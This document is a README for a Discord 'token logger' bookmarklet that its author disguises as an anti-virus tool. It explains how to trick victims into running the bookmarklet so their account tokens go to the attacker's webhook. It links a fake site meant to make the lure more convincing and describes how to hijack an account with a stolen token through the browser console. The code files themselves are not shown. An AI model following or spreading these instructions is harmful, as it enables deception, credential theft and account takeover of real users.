# Bookmarklet Token Logger for Discord
A token logger for discord, disguised as an anti-virus, by fluke 
You can use this site to be a little more convincing: https://discord-antivirus.flukehusky.repl.co/

Note: Please use this at your own risk. This is for educational purposes only. I am not responsible for damages caused to others. 

# How to use:

go to main.js and copy the code from there. Then paste the code into a bookmark URL. To activate, press on the bookmark while on discord. Only works on discord browser.

To token log someone else, tell them to paste the code into a bookmark, exactly like stated above ^. Once they have pressed on the bookmark, your webhook bot should have sent you there token.

# Side Note:

Make sure to make a webhook before activating. Where it says "Web hook URL," paste in the web hook link.

# How to log into someones account with token:

copy the code from login.js and paste it into the console (CTRL + SHIFT + J on chrome) and paste in the token where it says "token_here". You're good to go! Please use this responsibly. I made this a little obvious so others can tell this is a token logger.
